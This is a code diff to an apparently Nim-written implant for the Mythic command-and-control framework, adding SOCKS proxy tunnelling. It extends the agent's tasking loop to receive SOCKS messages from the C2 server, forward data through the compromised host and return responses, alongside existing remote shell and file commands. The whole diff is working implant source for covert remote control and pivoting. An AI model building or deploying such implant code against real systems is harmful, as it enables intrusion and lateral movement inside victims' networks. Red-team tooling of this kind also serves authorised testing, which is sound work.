@@ -18,6 +18,7 @@ import tasks/ps
 import tasks/pwd
 import tasks/rm
 import tasks/pty
+import tasks/socks
 
 # Windows-only commands
 when defined(windows):
@@ -148,9 +149,9 @@ proc checkin*(agent: Agent): bool =
   
   return false
 
-proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode]] =
+proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode], socks: seq[JsonNode]] =
   ## Get tasking from Mythic
-  ## Returns both tasks and interactive messages
+  ## Returns tasks, interactive messages, and socks messages
   let getTaskingMsg = %*{
     "action": "get_tasking",
     "tasking_size": -1
@@ -159,10 +160,11 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
   let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
   
   if response.len == 0:
-    return (@[], @[])
+    return (@[], @[], @[])
   
   var tasks: seq[JsonNode] = @[]
   var interactive: seq[JsonNode] = @[]
+  var socks: seq[JsonNode] = @[]
   
   try:
     let respJson = parseJson(response)
@@ -177,11 +179,16 @@ proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonN
       if agent.config.debug:
         echo "[DEBUG] Received ", interactive.len, " interactive message(s)"
     
-    return (tasks, interactive)
+    if respJson.hasKey("socks"):
+      socks = respJson["socks"].getElems()
+      if agent.config.debug:
+        echo "[DEBUG] Received ", socks.len, " socks message(s)"
+    
+    return (tasks, interactive, socks)
   except:
     if agent.config.debug:
       echo "[DEBUG] Failed to parse tasking: ", getCurrentExceptionMsg()
-    return (@[], @[])
+    return (@[], @[], @[])
 
 
 
@@ -196,6 +203,18 @@ proc processInteractive*(agent: var Agent, interactive: seq[JsonNode]) =
     let response = handlePtyInteractive(taskId, @[msg])
     if response.len > 0:
       agent.taskResponses.add(response)
+
+proc processSocks*(agent: var Agent, socksMessages: seq[JsonNode]) =
+  ## Process SOCKS messages (data forwarding from Mythic)
+  if socksMessages.len > 0:
+    if agent.config.debug:
+      echo "[DEBUG] Processing ", socksMessages.len, " SOCKS message(s)"
+    
+    # Handle all SOCKS messages and get responses to send back
+    let responses = handleSocksMessages(socksMessages)
+    for response in responses:
+      # Wrap each SOCKS message in the format expected by postResponses
+      agent.taskResponses.add(%*{"socks": [response]})
 
 proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
   ## Process received tasks
@@ -560,6 +579,15 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
             "status": "error"
           }
       
+      of "socks":
+        if agent.config.debug:
+          echo "[DEBUG] Executing socks command"
+        response = socks(taskId, params)
+        # SOCKS sessions don't complete immediately
+        if response.hasKey("status") and response["status"].getStr() == "processing":
+          agent.taskResponses.add(response)
+          continue
+      
       else:
         # Command not implemented
         if agent.config.debug:
@@ -596,9 +624,10 @@ proc postResponses*(agent: var Agent) =
     echo "[DEBUG] === POSTING RESPONSES ==="
     echo "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
   
-  # Separate interactive messages from regular responses
+  # Separate interactive and socks messages from regular responses
   var regularResponses: seq[JsonNode] = @[]
   var interactiveMessages: seq[JsonNode] = @[]
+  var socksMessages: seq[JsonNode] = @[]
   
   for resp in agent.taskResponses:
     if resp.hasKey("interactive"):
@@ -614,6 +643,12 @@ proc postResponses*(agent: var Agent) =
         var cleanResp = resp.copy()
         cleanResp.delete("interactive")
         regularResponses.add(cleanResp)
+    elif resp.hasKey("socks"):
+      # Extract socks messages and add to top-level array
+      let messages = resp["socks"].getElems()
+      for msg in messages:
+        socksMessages.add(msg)
+      # Don't add the socks wrapper to responses
     else:
       regularResponses.add(resp)
   
@@ -626,6 +661,10 @@ proc postResponses*(agent: var Agent) =
   # Add interactive messages at top level if any
   if interactiveMessages.len > 0:
     postMsg["interactive"] = %interactiveMessages
+  
+  # Add socks messages at top level if any
+  if socksMessages.len > 0:
+    postMsg["socks"] = %socksMessages
   
   let response = agent.profile.send($postMsg, agent.callbackUuid)
   
@@ -844,11 +883,14 @@ proc runAgent*() =
   
   # Main agent loop
   while not agentInstance.shouldExit:
-    # Get tasking from Mythic (returns both tasks and interactive messages)
-    let (tasks, interactive) = agentInstance.getTasks()
+    # Get tasking from Mythic (returns tasks, interactive, and socks messages)
+    let (tasks, interactive, socksMessages) = agentInstance.getTasks()
     
     # Process interactive messages first (PTY input)
     agentInstance.processInteractive(interactive)
+    
+    # Process SOCKS messages (data forwarding)
+    agentInstance.processSocks(socksMessages)
     
     # Process tasks
     agentInstance.processTasks(tasks)
@@ -857,6 +899,11 @@ proc runAgent*() =
     let ptyResponses = checkActivePtySessions()
     for response in ptyResponses:
       agentInstance.taskResponses.add(response)
+    
+    # Check active SOCKS connections for data (non-blocking via threads)
+    let socksResponses = checkActiveSocksConnections()
+    for response in socksResponses:
+      agentInstance.taskResponses.add(%*{"socks": [response]})
     
     # Send responses back (handles background task state machine)
     agentInstance.postResponses()
